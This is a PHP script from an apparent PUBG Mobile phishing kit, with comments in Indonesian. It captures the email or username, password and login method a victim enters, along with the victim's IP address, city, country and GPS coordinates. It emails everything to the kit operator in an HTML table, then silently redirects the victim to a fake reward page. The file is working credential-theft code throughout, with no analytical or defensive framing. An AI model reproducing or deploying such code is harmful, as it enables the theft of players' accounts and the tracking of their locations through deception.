<?php
include 'system/sett.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$user = new get_flag();
$email = $user->post($_POST['email']);
$password = $user->post($_POST['password']);
$login = $user->post($_POST['login']);

$benua = $bg['continent'];
$negara = $bg['country'];
$codeflag = $bg['countryCode'];
$region = $bg['regionName'];
$city = $bg['city'];
$latitude = $bg['lat'];
$longtitude = $bg['lon'];
$timezone = $bg['timezone'];
$perdana = $bg['isp'];
$ipaddress = $bg['query'];

if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}else{

    $subjek = "$resultFlags $codeflag ⥇ $negara | PUNYA SI $email | LEVEL $level | LOGIN $login";
    $pesan = '
    <center> 
    <div style="background: url(https://bit.ly/3s4lTBs) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
    <div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">PUBG MOBILE</div>
    <table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
    <tr>
    <th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
    <th style="width: 78%; text-align: center;"><b>'.$email.'</th> 
    </tr>
    <tr>
    <th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
    <th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
    </tr>
    <tr>
    <th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
    <th style="width: 78%; text-align: center;"><b>'.$login.'</th> 
    </tr>
    </table>
    <div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;"></div>
    <table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
    <tr>
    <th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
    <th style="width: 78%; text-align: center;"><b>'.$negara.'</th> 
    </tr>
    <tr>
    <th style="width: 22%; text-align: left;" height="25px"><b>KODE NEGARA</th>
    <th style="width: 78%; text-align: center;"><b>'.$codeflag.'</th> 
    </tr>
    <tr>
    <th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
    <th style="width: 78%; text-align: center;"><b>'.$city.'</th> 
    </tr>
    <tr>
    <th style="width: 22%; text-align: left;" height="25px"><b>LATITUDE</th>
    <th style="width: 78%; text-align: center;"><b>'.$latitude.'</th> 
    </tr>
    <tr>
    <th style="width: 22%; text-align: left;" height="25px"><b>LONGITUDE</th>
    <th style="width: 78%; text-align: center;"><b>'.$longtitude.'</th> 
    </tr>
    <tr>
    <th style="width: 22%; text-align: left;" height="25px"><b>ALAMAT IP</th>
    <th style="width: 78%; text-align: center;"><b>'.$ipaddress.'</th> 
    </tr>
    <tr>
    <th style="width: 22%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
    <th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
    </tr>
    </table>
    <div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
    <div style="float: left; margin-top: 3%;">
    </div>
    </div>
    </center>
    ';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$user->mail($emailku, $subjek, $pesan, $headers);

// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
echo "<form id='ss' method='POST' action='process-rewrd.php'>
<input type='hidden' name='email' value='$email'>
</form>
<script type='text/javascript'>document.getElementById('ss').submit();</script>";
}
?>
